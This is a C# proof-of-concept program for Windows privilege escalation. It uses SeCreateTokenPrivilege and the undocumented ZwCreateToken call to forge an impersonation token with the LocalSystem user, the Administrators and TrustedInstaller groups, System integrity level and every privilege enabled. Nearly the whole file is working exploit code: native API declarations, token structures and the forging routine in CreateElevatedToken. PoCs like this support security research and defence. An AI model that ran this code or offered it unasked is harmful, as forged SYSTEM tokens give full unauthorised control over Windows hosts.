using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace SeCreateTokenPrivilegePoC
{
    class SeCreateTokenPrivilegePoC
    {
        // Windows definition
        // Windows enum
        [Flags]
        enum FormatMessageFlags : uint
        {
            FORMAT_MESSAGE_ALLOCATE_BUFFER = 0x00000100,
            FORMAT_MESSAGE_IGNORE_INSERTS = 0x00000200,
            FORMAT_MESSAGE_FROM_STRING = 0x00000400,
            FORMAT_MESSAGE_FROM_HMODULE = 0x00000800,
            FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000,
            FORMAT_MESSAGE_ARGUMENT_ARRAY = 0x00002000
        }

        enum SECURITY_IMPERSONATION_LEVEL
        {
            SecurityAnonymous,
            SecurityIdentification,
            SecurityImpersonation,
            SecurityDelegation
        }

        [Flags]
        enum SE_GROUP_ATTRIBUTES : uint
        {
            SE_GROUP_MANDATORY = 0x00000001,
            SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002,
            SE_GROUP_ENABLED = 0x00000004,
            SE_GROUP_OWNER = 0x00000008,
            SE_GROUP_USE_FOR_DENY_ONLY = 0x00000010,
            SE_GROUP_INTEGRITY = 0x00000020,
            SE_GROUP_INTEGRITY_ENABLED = 0x00000040,
            SE_GROUP_RESOURCE = 0x20000000,
            SE_GROUP_LOGON_ID = 0xC0000000
        }

        [Flags]
        enum SE_PRIVILEGE_ATTRIBUTES : uint
        {
            SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001,
            SE_PRIVILEGE_ENABLED = 0x00000002,
            SE_PRIVILEGE_USED_FOR_ACCESS = 0x80000000,
        }

        enum SID_NAME_USE
        {
            SidTypeUser = 1,
            SidTypeGroup,
            SidTypeDomain,
            SidTypeAlias,
            SidTypeWellKnownGroup,
            SidTypeDeletedAccount,
            SidTypeInvalid,
            SidTypeUnknown,
            SidTypeComputer
        }

        [Flags]
        enum TokenAccessFlags : uint
        {
            TOKEN_ADJUST_DEFAULT = 0x0080,
            TOKEN_ADJUST_GROUPS = 0x0040,
            TOKEN_ADJUST_PRIVILEGES = 0x0020,
            TOKEN_ADJUST_SESSIONID = 0x0100,
            TOKEN_ASSIGN_PRIMARY = 0x0001,
            TOKEN_DUPLICATE = 0x0002,
            TOKEN_EXECUTE = 0x00020000,
            TOKEN_IMPERSONATE = 0x0004,
            TOKEN_QUERY = 0x0008,
            TOKEN_QUERY_SOURCE = 0x0010,
            TOKEN_READ = 0x00020008,
            TOKEN_WRITE = 0x000200E0,
            TOKEN_ALL_ACCESS = 0x000F01FF,
            MAXIMUM_ALLOWED = 0x02000000
        }

        enum TOKEN_INFORMATION_CLASS
        {
            TokenUser = 1,
            TokenGroups,
            TokenPrivileges,
            TokenOwner,
            TokenPrimaryGroup,
            TokenDefaultDacl,
            TokenSource,
            TokenType,
            TokenImpersonationLevel,
            TokenStatistics,
            TokenRestrictedSids,
            TokenSessionId,
            TokenGroupsAndPrivileges,
            TokenSessionReference,
            TokenSandBoxInert,
            TokenAuditPolicy,
            TokenOrigin,
            TokenElevationType,
            TokenLinkedToken,
            TokenElevation,
            TokenHasRestrictions,
            TokenAccessInformation,
            TokenVirtualizationAllowed,
            TokenVirtualizationEnabled,
            TokenIntegrityLevel,
            TokenUIAccess,
            TokenMandatoryPolicy,
            TokenLogonSid,
            MaxTokenInfoClass
        }

        enum TOKEN_TYPE
        {
            TokenPrimary = 1,
            TokenImpersonation
        }

        // Windows Struct
        [StructLayout(LayoutKind.Explicit, Size = 8)]
        struct LARGE_INTEGER
        {
            [FieldOffset(0)]
            public int Low;
            [FieldOffset(4)]
            public int High;
            [FieldOffset(0)]
            public long QuadPart;

            public LARGE_INTEGER(int _low, int _high)
            {
                QuadPart = 0L;
                Low = _low;
                High = _high;
            }

            public LARGE_INTEGER(long _quad)
            {
                Low = 0;
                High = 0;
                QuadPart = _quad;
            }

            public long ToInt64()
            {
                return ((long)this.High << 32) | (uint)this.Low;
            }

            public static LARGE_INTEGER FromInt64(long value)
            {
                return new LARGE_INTEGER
                {
                    Low = (int)(value),
                    High = (int)((value >> 32))
                };
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct LUID
        {
            public uint LowPart;
            public uint HighPart;

            public LUID(uint _lowPart, uint _highPart)
            {
                LowPart = _lowPart;
                HighPart = _highPart;
            }
        }

        [StructLayout(LayoutKind.Sequential, Pack = 4)]
        struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct OBJECT_ATTRIBUTES : IDisposable
        {
            public int Length;
            public IntPtr RootDirectory;
            private IntPtr objectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;

            public OBJECT_ATTRIBUTES(string name, uint attrs)
            {
                Length = 0;
                RootDirectory = IntPtr.Zero;
                objectName = IntPtr.Zero;
                Attributes = attrs;
                SecurityDescriptor = IntPtr.Zero;
                SecurityQualityOfService = IntPtr.Zero;

                Length = Marshal.SizeOf(this);
                ObjectName = new UNICODE_STRING(name);
            }

            public UNICODE_STRING ObjectName
            {
                get
                {
                    return (UNICODE_STRING)Marshal.PtrToStructure(
                        objectName, typeof(UNICODE_STRING));
                }

                set
                {
                    bool fDeleteOld = objectName != IntPtr.Zero;
                    if (!fDeleteOld)
                        objectName = Marshal.AllocHGlobal(Marshal.SizeOf(value));
                    Marshal.StructureToPtr(value, objectName, fDeleteOld);
                }
            }

            public void Dispose()
            {
                if (objectName != IntPtr.Zero)
                {
                    Marshal.DestroyStructure(objectName, typeof(UNICODE_STRING));
                    Marshal.FreeHGlobal(objectName);
                    objectName = IntPtr.Zero;
                }
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SECURITY_QUALITY_OF_SERVICE
        {
            readonly int Length;
            readonly SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
            readonly byte ContextTrackingMode;
            readonly byte EffectiveOnly;

            public SECURITY_QUALITY_OF_SERVICE(
                SECURITY_IMPERSONATION_LEVEL _impersonationLevel,
                byte _contextTrackingMode,
                byte _effectiveOnly)
            {
                Length = 0;
                ImpersonationLevel = _impersonationLevel;
                ContextTrackingMode = _contextTrackingMode;
                EffectiveOnly = _effectiveOnly;

                Length = Marshal.SizeOf(this);
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SID
        {
            public byte Revision;
            public byte SubAuthorityCount;
            public SID_IDENTIFIER_AUTHORITY IdentifierAuthority;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            public uint[] SubAuthority;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid; // PSID
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SID_IDENTIFIER_AUTHORITY
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6)]
            public byte[] Value;

            public SID_IDENTIFIER_AUTHORITY(byte[] value)
            {
                Value = value;
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_DEFAULT_DACL
        {
            public IntPtr DefaultDacl; // PACL
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_GROUPS
        {
            public int GroupCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 32)]
            public SID_AND_ATTRIBUTES[] Groups;

            public TOKEN_GROUPS(int privilegeCount)
            {
                GroupCount = privilegeCount;
                Groups = new SID_AND_ATTRIBUTES[32];
            }
        };

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_OWNER
        {
            public IntPtr Owner; // PSID

            public TOKEN_OWNER(IntPtr _owner)
            {
                Owner = _owner;
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_PRIMARY_GROUP
        {
            public IntPtr PrimaryGroup; // PSID

            public TOKEN_PRIMARY_GROUP(IntPtr _sid)
            {
                PrimaryGroup = _sid;
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_PRIVILEGES
        {
            public int PrivilegeCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
            public LUID_AND_ATTRIBUTES[] Privileges;

            public TOKEN_PRIVILEGES(int privilegeCount)
            {
                PrivilegeCount = privilegeCount;
                Privileges = new LUID_AND_ATTRIBUTES[36];
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_SOURCE
        {
            public TOKEN_SOURCE(string name)
            {
                SourceName = new byte[8];
                Encoding.GetEncoding(1252).GetBytes(name, 0, name.Length, SourceName, 0);
                if (!AllocateLocallyUniqueId(out SourceIdentifier))
                    throw new System.ComponentModel.Win32Exception();
            }

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public byte[] SourceName;
            public LUID SourceIdentifier;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;

            public TOKEN_USER(IntPtr _sid)
            {
                User = new SID_AND_ATTRIBUTES
                {
                    Sid = _sid,
                    Attributes = 0
                };
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct UNICODE_STRING : IDisposable
        {
            public ushort Length;
            public ushort MaximumLength;
            private IntPtr buffer;

            public UNICODE_STRING(string s)
            {
                Length = (ushort)(s.Length * 2);
                MaximumLength = (ushort)(Length + 2);
                buffer = Marshal.StringToHGlobalUni(s);
            }

            public void Dispose()
            {
                Marshal.FreeHGlobal(buffer);
                buffer = IntPtr.Zero;
            }

            public override string ToString()
            {
                return Marshal.PtrToStringUni(buffer);
            }
        }

        // Windows API
        /*
         * advapi32.dll
         */
        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool AllocateLocallyUniqueId(out LUID Luid);

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSid, out string strSid);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertStringSidToSid(string StringSid, out IntPtr pSid);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(
            IntPtr TokenHandle,
            TOKEN_INFORMATION_CLASS TokenInformationClass,
            IntPtr TokenInformation,
            int TokenInformationLength,
            out int ReturnLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool IsValidSid(IntPtr pSid);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool LookupAccountName(
            IntPtr lpSystemName,
            string lpAccountName,
            IntPtr Sid,
            ref int cbSid,
            StringBuilder ReferencedDomainName,
            ref int cchReferencedDomainName,
            out SID_NAME_USE peUse);

        [DllImport("advapi32.dll")]
        static extern bool LookupPrivilegeValue(
            string lpSystemName,
            string lpName,
            out LUID lpLuid);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool SetThreadToken(
            IntPtr pHandle,
            IntPtr hToken);

        /*
         * kenel32.dll
         */
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hModule);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern int FormatMessage(
            FormatMessageFlags dwFlags,
            IntPtr lpSource,
            int dwMessageId,
            int dwLanguageId,
            StringBuilder lpBuffer,
            int nSize,
            IntPtr Arguments);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool FreeLibrary(IntPtr hLibModule);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern int GetCurrentThreadId();

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LocalFree(IntPtr hMem);

        /*
         * ntdll.dll
         */
        [DllImport("ntdll.dll")]
        static extern void RtlGetNtVersionNumbers(
            ref int MajorVersion,
            ref int MinorVersion,
            ref int BuildNumber);

        [DllImport("ntdll.dll")]
        static extern int ZwCreateToken(
            out IntPtr TokenHandle,
            TokenAccessFlags DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            TOKEN_TYPE TokenType,
            ref LUID AuthenticationId,
            ref LARGE_INTEGER ExpirationTime,
            ref TOKEN_USER TokenUser,
            ref TOKEN_GROUPS TokenGroups,
            ref TOKEN_PRIVILEGES TokenPrivileges,
            ref TOKEN_OWNER TokenOwner,
            ref TOKEN_PRIMARY_GROUP TokenPrimaryGroup,
            ref TOKEN_DEFAULT_DACL TokenDefaultDacl,
            ref TOKEN_SOURCE TokenSource);

        const int STATUS_SUCCESS = 0;
        const int ERROR_INSUFFICIENT_BUFFER = 0x0000007A;
        const string DOMAIN_ALIAS_RID_ADMINS = "S-1-5-32-544";
        const string TRUSTED_INSTALLER_RID = "S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464";
        const string UNTRUSTED_MANDATORY_LEVEL = "S-1-16-0";
        const string LOW_MANDATORY_LEVEL = "S-1-16-4096";
        const string MEDIUM_MANDATORY_LEVEL = "S-1-16-8192";
        const string MEDIUM_PLUS_MANDATORY_LEVEL = "S-1-16-8448";
        const string HIGH_MANDATORY_LEVEL = "S-1-16-12288";
        const string SYSTEM_MANDATORY_LEVEL = "S-1-16-16384";
        const string LOCAL_SYSTEM_RID = "S-1-5-18";
        const string SE_CREATE_TOKEN_NAME = "SeCreateTokenPrivilege";
        const string SE_ASSIGNPRIMARYTOKEN_NAME = "SeAssignPrimaryTokenPrivilege";
        const string SE_LOCK_MEMORY_NAME = "SeLockMemoryPrivilege";
        const string SE_INCREASE_QUOTA_NAME = "SeIncreaseQuotaPrivilege";
        const string SE_MACHINE_ACCOUNT_NAME = "SeMachineAccountPrivilege";
        const string SE_TCB_NAME = "SeTcbPrivilege";
        const string SE_SECURITY_NAME = "SeSecurityPrivilege";
        const string SE_TAKE_OWNERSHIP_NAME = "SeTakeOwnershipPrivilege";
        const string SE_LOAD_DRIVER_NAME = "SeLoadDriverPrivilege";
        const string SE_SYSTEM_PROFILE_NAME = "SeSystemProfilePrivilege";
        const string SE_SYSTEMTIME_NAME = "SeSystemtimePrivilege";
        const string SE_PROFILE_SINGLE_PROCESS_NAME = "SeProfileSingleProcessPrivilege";
        const string SE_INCREASE_BASE_PRIORITY_NAME = "SeIncreaseBasePriorityPrivilege";
        const string SE_CREATE_PAGEFILE_NAME = "SeCreatePagefilePrivilege";
        const string SE_CREATE_PERMANENT_NAME = "SeCreatePermanentPrivilege";
        const string SE_BACKUP_NAME = "SeBackupPrivilege";
        const string SE_RESTORE_NAME = "SeRestorePrivilege";
        const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";
        const string SE_DEBUG_NAME = "SeDebugPrivilege";
        const string SE_AUDIT_NAME = "SeAuditPrivilege";
        const string SE_SYSTEM_ENVIRONMENT_NAME = "SeSystemEnvironmentPrivilege";
        const string SE_CHANGE_NOTIFY_NAME = "SeChangeNotifyPrivilege";
        const string SE_REMOTE_SHUTDOWN_NAME = "SeRemoteShutdownPrivilege";
        const string SE_UNDOCK_NAME = "SeUndockPrivilege";
        const string SE_SYNC_AGENT_NAME = "SeSyncAgentPrivilege";
        const string SE_ENABLE_DELEGATION_NAME = "SeEnableDelegationPrivilege";
        const string SE_MANAGE_VOLUME_NAME = "SeManageVolumePrivilege";
        const string SE_IMPERSONATE_NAME = "SeImpersonatePrivilege";
        const string SE_CREATE_GLOBAL_NAME = "SeCreateGlobalPrivilege";
        const string SE_TRUSTED_CREDMAN_ACCESS_NAME = "SeTrustedCredManAccessPrivilege";
        const string SE_RELABEL_NAME = "SeRelabelPrivilege";
        const string SE_INCREASE_WORKING_SET_NAME = "SeIncreaseWorkingSetPrivilege";
        const string SE_TIME_ZONE_NAME = "SeTimeZonePrivilege";
        const string SE_CREATE_SYMBOLIC_LINK_NAME = "SeCreateSymbolicLinkPrivilege";
        const string SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME = "SeDelegateSessionUserImpersonatePrivilege";
        const byte SECURITY_STATIC_TRACKING = 0;
        static readonly LUID SYSTEM_LUID = new LUID(0x3e7, 0);


        static IntPtr CreateElevatedToken(TOKEN_TYPE tokenType)
        {
            int error;
            LUID authId = SYSTEM_LUID;
            var tokenSource = new TOKEN_SOURCE("*SYSTEM*");
            tokenSource.SourceIdentifier.HighPart = 0;
            tokenSource.SourceIdentifier.LowPart = 0;
            var privs = new string[] {
                SE_CREATE_TOKEN_NAME,
                SE_ASSIGNPRIMARYTOKEN_NAME,
                SE_LOCK_MEMORY_NAME,
                SE_INCREASE_QUOTA_NAME,
                SE_MACHINE_ACCOUNT_NAME,
                SE_TCB_NAME,
                SE_SECURITY_NAME,
                SE_TAKE_OWNERSHIP_NAME,
                SE_LOAD_DRIVER_NAME,
                SE_SYSTEM_PROFILE_NAME,
                SE_SYSTEMTIME_NAME,
                SE_PROFILE_SINGLE_PROCESS_NAME,
                SE_INCREASE_BASE_PRIORITY_NAME,
                SE_CREATE_PAGEFILE_NAME,
                SE_CREATE_PERMANENT_NAME,
                SE_BACKUP_NAME,
                SE_RESTORE_NAME,
                SE_SHUTDOWN_NAME,
                SE_DEBUG_NAME,
                SE_AUDIT_NAME,
                SE_SYSTEM_ENVIRONMENT_NAME,
                SE_CHANGE_NOTIFY_NAME,
                SE_REMOTE_SHUTDOWN_NAME,
                SE_UNDOCK_NAME,
                SE_SYNC_AGENT_NAME,
                SE_ENABLE_DELEGATION_NAME,
                SE_MANAGE_VOLUME_NAME,
                SE_IMPERSONATE_NAME,
                SE_CREATE_GLOBAL_NAME,
                SE_TRUSTED_CREDMAN_ACCESS_NAME,
                SE_RELABEL_NAME,
                SE_INCREASE_WORKING_SET_NAME,
                SE_TIME_ZONE_NAME,
                SE_CREATE_SYMBOLIC_LINK_NAME,
                SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME
            };

            Console.WriteLine("[>] Trying to create an elevated {0} token.",
                tokenType == TOKEN_TYPE.TokenPrimary ? "primary" : "impersonation");

            if (!ConvertStringSidToSid(
                DOMAIN_ALIAS_RID_ADMINS,
                out IntPtr pAdministrators))
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to get SID for Administrators.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return IntPtr.Zero;
            }

            if (!ConvertStringSidToSid(
                LOCAL_SYSTEM_RID,
                out IntPtr pLocalSystem))
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to get SID for LocalSystem.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return IntPtr.Zero;
            }

            if (!ConvertStringSidToSid(
                SYSTEM_MANDATORY_LEVEL,
                out IntPtr pSystemIntegrity))
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to get SID for LocalSystem.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return IntPtr.Zero;
            }

            if (!ConvertStringSidToSid(
                TRUSTED_INSTALLER_RID,
                out IntPtr pTrustedInstaller))
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to get SID for TrustedInstaller.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return IntPtr.Zero;
            }

            if (!CreateTokenPrivileges(
                privs,
                out TOKEN_PRIVILEGES tokenPrivileges))
            {
                return IntPtr.Zero;
            }

            IntPtr hCurrentToken = WindowsIdentity.GetCurrent().Token;
            IntPtr pTokenGroups = GetInformationFromToken(
                hCurrentToken,
                TOKEN_INFORMATION_CLASS.TokenGroups);
            IntPtr pTokenDefaultDacl = GetInformationFromToken(
                hCurrentToken,
                TOKEN_INFORMATION_CLASS.TokenDefaultDacl);

            if (pTokenDefaultDacl == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to get current token information.");

                return IntPtr.Zero;
            }
            var tokenUser = new TOKEN_USER(pLocalSystem);
            var tokenGroups = (TOKEN_GROUPS)Marshal.PtrToStructure(
                pTokenGroups,
                typeof(TOKEN_GROUPS));
            var tokenOwner = new TOKEN_OWNER(pAdministrators);
            var tokenPrimaryGroup = new TOKEN_PRIMARY_GROUP(pLocalSystem);
            var tokenDefaultDacl = (TOKEN_DEFAULT_DACL)Marshal.PtrToStructure(
                pTokenDefaultDacl,
                typeof(TOKEN_DEFAULT_DACL));

            StringComparison opt = StringComparison.OrdinalIgnoreCase;
            uint groupOwnerAttrs = (uint)(
                SE_GROUP_ATTRIBUTES.SE_GROUP_ENABLED_BY_DEFAULT |
                SE_GROUP_ATTRIBUTES.SE_GROUP_ENABLED |
                SE_GROUP_ATTRIBUTES.SE_GROUP_OWNER);
            uint groupEnabledAttrs = (uint)(
                SE_GROUP_ATTRIBUTES.SE_GROUP_ENABLED_BY_DEFAULT |
                SE_GROUP_ATTRIBUTES.SE_GROUP_ENABLED);
            bool isAdmin = false;
            bool isSystem = false;

            for (var idx = 0; idx < tokenGroups.GroupCount; idx++)
            {
                ConvertSidToStringSid(
                    tokenGroups.Groups[idx].Sid,
                    out string strSid);

                if (string.Compare(strSid, DOMAIN_ALIAS_RID_ADMINS, opt) == 0)
                {
                    isAdmin = true;

                    if (tokenGroups.Groups[idx].Attributes != groupOwnerAttrs)
                        tokenGroups.Groups[idx].Attributes = groupOwnerAttrs;
                }
                else if (string.Compare(strSid, LOCAL_SYSTEM_RID, opt) == 0)
                {
                    isSystem = true;
                }
                else if (string.Compare(strSid, UNTRUSTED_MANDATORY_LEVEL, opt) == 0 |
                    string.Compare(strSid, LOW_MANDATORY_LEVEL, opt) == 0 |
                    string.Compare(strSid, MEDIUM_MANDATORY_LEVEL, opt) == 0 |
                    string.Compare(strSid, MEDIUM_PLUS_MANDATORY_LEVEL, opt) == 0 |
                    string.Compare(strSid, HIGH_MANDATORY_LEVEL, opt) == 0)
                {
                    tokenGroups.Groups[idx].Sid = pSystemIntegrity;
                }
            }

            tokenGroups.Groups[tokenGroups.GroupCount].Sid = pTrustedInstaller;
            tokenGroups.Groups[tokenGroups.GroupCount].Attributes = groupOwnerAttrs;
            tokenGroups.GroupCount++;

            if (!isAdmin)
            {
                tokenGroups.Groups[tokenGroups.GroupCount].Sid = pAdministrators;
                tokenGroups.Groups[tokenGroups.GroupCount].Attributes = groupOwnerAttrs;
                tokenGroups.GroupCount++;
            }

            if (!isSystem)
            {
                tokenGroups.Groups[tokenGroups.GroupCount].Sid = pLocalSystem;
                tokenGroups.Groups[tokenGroups.GroupCount].Attributes = groupEnabledAttrs;
                tokenGroups.GroupCount++;
            }

            var expirationTime = new LARGE_INTEGER(-1L);
            SECURITY_IMPERSONATION_LEVEL impersonationLevel;

            if (tokenType == TOKEN_TYPE.TokenPrimary)
                impersonationLevel = SECURITY_IMPERSONATION_LEVEL.SecurityAnonymous;
            else
                impersonationLevel = SECURITY_IMPERSONATION_LEVEL.SecurityDelegation;

            var sqos = new SECURITY_QUALITY_OF_SERVICE(
                impersonationLevel,
                SECURITY_STATIC_TRACKING,
                0);
            var oa = new OBJECT_ATTRIBUTES(string.Empty, 0);
            IntPtr pSqos = Marshal.AllocHGlobal(Marshal.SizeOf(sqos));
            Marshal.StructureToPtr(sqos, pSqos, true);
            oa.SecurityQualityOfService = pSqos;

            int ntstatus = ZwCreateToken(
                out IntPtr hToken,
                TokenAccessFlags.TOKEN_ALL_ACCESS,
                ref oa,
                tokenType,
                ref authId,
                ref expirationTime,
                ref tokenUser,
                ref tokenGroups,
                ref tokenPrivileges,
                ref tokenOwner,
                ref tokenPrimaryGroup,
                ref tokenDefaultDacl,
                ref tokenSource);

            LocalFree(pTokenGroups);
            LocalFree(pTokenDefaultDacl);

            if (ntstatus != STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to create elevated token.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(ntstatus, true));

                return IntPtr.Zero;
            }

            Console.WriteLine("[+] An elevated {0} token is created successfully.",
                tokenType == TOKEN_TYPE.TokenPrimary ? "primary" : "impersonation");

            return hToken;
        }


        static bool CreateTokenPrivileges(
            string[] privs,
            out TOKEN_PRIVILEGES tokenPrivileges)
        {
            int error;
            int sizeOfStruct = Marshal.SizeOf(typeof(TOKEN_PRIVILEGES));
            IntPtr pPrivileges = Marshal.AllocHGlobal(sizeOfStruct);

            tokenPrivileges = (TOKEN_PRIVILEGES)Marshal.PtrToStructure(
                pPrivileges,
                typeof(TOKEN_PRIVILEGES));
            tokenPrivileges.PrivilegeCount = privs.Length;

            for (var idx = 0; idx < tokenPrivileges.PrivilegeCount; idx++)
            {
                if (!LookupPrivilegeValue(
                    null,
                    privs[idx],
                    out LUID luid))
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to lookup LUID for {0}.", privs[idx]);
                    Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                    return false;
                }

                tokenPrivileges.Privileges[idx].Attributes = (uint)(
                    SE_PRIVILEGE_ATTRIBUTES.SE_PRIVILEGE_ENABLED |
                    SE_PRIVILEGE_ATTRIBUTES.SE_PRIVILEGE_ENABLED_BY_DEFAULT);
                tokenPrivileges.Privileges[idx].Luid = luid;
            }

            return true;
        }


        static IntPtr GetInformationFromToken(
            IntPtr hToken,
            TOKEN_INFORMATION_CLASS tokenInfoClass)
        {
            bool status;
            int error;
            int length = 32;
            IntPtr buffer;

            do
            {
                buffer = Marshal.AllocHGlobal(length);
                ZeroMemory(buffer, length);
                status = GetTokenInformation(hToken, tokenInfoClass, buffer, length, out length);
                error = Marshal.GetLastWin32Error();

                if (!status)
                    Marshal.FreeHGlobal(buffer);
            } while (!status && error == ERROR_INSUFFICIENT_BUFFER);

            if (!status)
            {
                Marshal.FreeHGlobal(buffer);

                return IntPtr.Zero;
            }

            return buffer;
        }


        static string GetWin32ErrorMessage(int code, bool isNtStatus)
        {
            var message = new StringBuilder();
            var messageSize = 255;
            FormatMessageFlags messageFlag;
            IntPtr pNtdll;
            message.Capacity = messageSize;

            if (isNtStatus)
            {
                pNtdll = LoadLibrary("ntdll.dll");
                messageFlag = FormatMessageFlags.FORMAT_MESSAGE_FROM_HMODULE |
                    FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
            }
            else
            {
                pNtdll = IntPtr.Zero;
                messageFlag = FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
            }

            int ret = FormatMessage(
                messageFlag,
                pNtdll,
                code,
                0,
                message,
                messageSize,
                IntPtr.Zero);

            if (isNtStatus)
                FreeLibrary(pNtdll);

            if (ret == 0)
            {
                return string.Format("[ERROR] Code 0x{0}", code.ToString("X8"));
            }
            else
            {
                return string.Format(
                    "[ERROR] Code 0x{0} : {1}",
                    code.ToString("X8"),
                    message.ToString().Trim());
            }
        }


        static void ZeroMemory(IntPtr buffer, int size)
        {
            var nullBytes = new byte[size];
            Marshal.Copy(nullBytes, 0, buffer, size);
        }


        static void Main()
        {
            Console.WriteLine("[*] If you have SeCreateTokenPrivilege, you can create elevated tokens.");
            
            IntPtr hToken = CreateElevatedToken(TOKEN_TYPE.TokenImpersonation);

            if (hToken == IntPtr.Zero)
                return;

            Console.WriteLine("[+] Got handle to the elevated token (hToken = 0x{0}).", hToken.ToString("X"));
            Console.WriteLine("\n[*] To close the handle and exit this program, hit [ENTER] key.");
            Console.ReadLine();

            CloseHandle(hToken);
        }
    }
}